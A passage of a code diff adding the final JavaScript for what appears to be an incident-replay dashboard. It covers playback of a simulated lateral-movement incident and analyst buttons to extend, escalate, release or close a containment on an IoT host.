+  svg.querySelectorAll("[data-tip]").forEach((el) => {
+    el.addEventListener("mousemove", (ev) => {
+      const parts = el.dataset.tip.split("|");
+      tip.innerHTML = '<div class="tt">' + parts[0] + '</div><div class="tv">' + parts[1] + '</div><div class="td">' + parts[2] + '</div>';
+      tip.classList.add("on");
+      tip.style.left = Math.min(window.innerWidth - 260, ev.clientX + 14) + "px";
+      tip.style.top = Math.max(8, ev.clientY - 56) + "px";
+    });
+    el.addEventListener("mouseleave", () => tip.classList.remove("on"));
+  });
+}
+
+/* ---------------- transport ---------------- */
+function renderPhases(){
+  $("phases").innerHTML = PHASES.map((p) => {
+    const frac = (p.to - p.from) / TMAX;
+    return '<div class="phase" style="flex:' + frac + ' 1 0" title="' + p.name +
+           ' · t+' + p.from.toFixed(2) + 's to t+' + p.to.toFixed(2) + 's"><span>' +
+           (frac < 0.06 ? "&#9679;" : p.name) + '</span></div>';
+  }).join("");
+}
+
+let last = 0;
+function tick(ts){
+  if (state.playing){
+    if (!last) last = ts;
+    const dt = Math.min(0.25, (ts - last) / 1000) * state.speed;
+    last = ts;
+    state.t = Math.min(TMAX, state.t + dt);
+    render(false);
+    if (state.t >= TMAX) setPlaying(false);
+  } else {
+    last = 0;
+  }
+  requestAnimationFrame(tick);
+}
+
+function setPlaying(p){
+  state.playing = p;
+  $("play-glyph").innerHTML = p ? "&#10074;&#10074;" : "&#9654;";
+  $("play-label").textContent = p ? "Pause" : (state.t >= TMAX ? "Replay incident" : "Play incident");
+  $("mode-chip").textContent = p ? "replay running · lateral_movement" : "replay · lateral_movement";
+}
+
+function toast(msg, sub){
+  const el = $("toast");
+  el.innerHTML = msg + (sub ? '<span class="mono">' + sub + "</span>" : "");
+  el.classList.add("on");
+  clearTimeout(toast._t);
+  toast._t = setTimeout(() => el.classList.remove("on"), 4200);
+}
+
+/* ---------------- analyst actions ---------------- */
+state.log = [];
+function logAction(title, topic, k){
+  state.log.push({t:state.t, c:"AN", topic:topic, title:title, k:k || "act"});
+  state.rendered = -1;
+  render(true);
+}
+
+$("a-extend").addEventListener("click", () => {
+  const s = stateAt(state.t);
+  if (!s.contained){ toast("Nothing to extend.", "no lease is open on iot-07"); return; }
+  state.extended += 300;
+  logAction("Analyst extended lease on iot-07 by 300 s — new expiry t+" + leaseEnd().toFixed(2) + "s", "resp.action");
+  toast("Lease extended by 5 minutes.", "ContainmentAction(policy_id=bd1479261c7e, lease_seconds=306)");
+});
+
+$("a-escalate").addEventListener("click", () => {
+  logAction("Analyst escalated — level 3 isolate requested for host-0 (pending approval)", "resp.action", "crit");
+  toast("Escalation raised for host-0.", "host isolation needs a second approver — out of scope for automated policy");
+});
+
+$("a-release").addEventListener("click", () => {
+  const s = stateAt(state.t);
+  if (!s.contained){ toast("Containment is already clear.", "no active lease on iot-07"); return; }
+  state.closed = "analyst_override";
+  logAction("Analyst released containment on iot-07 — rollback executed", "resp.rollback", "good");
+  toast("Containment released.", "Rollback(policy_id=bd1479261c7e, reason=analyst_override, success=True)");
+});
+
+$("a-fp").addEventListener("click", () => {
+  state.closed = "disproved";
+  logAction("Analyst marked INC-0042 a false positive — evidence disproved, containment withdrawn", "resp.rollback", "good");
+  toast("Incident closed as false positive.", "Rollback(reason=disproved) · the correlation is fed back to C3 as a negative");
+});
+
+/* ---------------- wiring ---------------- */
+$("play").addEventListener("click", () => {
+  if (state.t >= TMAX) { state.t = 0; state.closed = null; state.extended = 0; state.log = []; state.rendered = -1; }
+  setPlaying(!state.playing);
+});
+$("reset").addEventListener("click", () => {
+  state.t = 0; state.closed = null; state.extended = 0; state.log = []; state.rendered = -1;
+  setPlaying(false);
+  render(true);
+});
+$("scrub").addEventListener("input", (e) => {
+  state.t = parseFloat(e.target.value);
+  if (state.t < LEASE_START){ state.closed = null; state.extended = 0; state.log = []; }
+  render(false);
+});
+document.querySelectorAll(".seg button").forEach((b) => {
+  b.addEventListener("click", () => {
+    state.speed = parseFloat(b.dataset.speed);
+    document.querySelectorAll(".seg button").forEach((x) => x.setAttribute("aria-pressed", String(x === b)));
+  });
+});
+
+$("evtotal").textContent = EVENTS.length;
+renderQueue();
+renderPhases();
+drawChain();
+drawLatency();
+drawC2();
+render(true);
+requestAnimationFrame(tick);
+</script>
+</body>
+</html>
